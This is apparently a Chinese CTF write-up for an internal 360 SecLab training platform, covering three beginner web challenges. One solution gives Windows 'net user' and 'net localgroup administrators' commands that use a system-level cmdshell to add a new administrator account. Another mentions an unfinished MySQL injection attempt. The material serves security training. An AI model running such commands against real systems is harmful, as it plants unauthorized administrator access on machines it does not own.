---
title: CTF-Web-01
date: 2021-04-12 21:45:37
categories:
- [360-SecLab, 360-CTF-Web篇]
tags: CTF
---

:::info

360CTF实训平台：http://172.18.25.55

仅限内网访问

:::

# 360-SecLab-Web-01

## 菜刀的相册

### 题目描述

进入题目页面，发现与上面MySQL一样，同样是通过$_GET[id]传参

题目网址：http://10.2.0.18/7/

### Write-up

{.primary}

- [ ] 未完成

MySQL注入，暂时没有成功，各位可以自行尝试一下

## 这是黑阔们经常干的事

### 题目描述

本题考察的是windows下cmd相关命令的使用。

题目网址：[http://10.2.0.18/8/index.asp](http://10.2.0.18/8/index.asp)

### Write-up

这是菜刀大牛的服务器的cmdshell，而且还是system权限，不信你可以输入whoami试试

据调查，他服务器的系统是Windows系统，请你添加一个管理员用户！

```shell
# 添加管理员账户lalala，密码123456
net user lalala 123456 /add

# 将用户lalala提升为管理员用户
net localgroup administrators lalala /add
```

用刚创建的账号密码[登录http://10.2.0.18/8/check.asp](http://10.2.0.18/8/check.asp)，获取key

## 老规矩，你懂的

### 题目描述

简单的web代码隐藏key的题目。

题目网址：[http://10.2.0.3/14/](http://10.2.0.3/14/)

### Write-up

浏览器打开题目地址，按F12查看源码，这不就是吗。。。

![key](https://i.vgy.me/18H3CR.png)

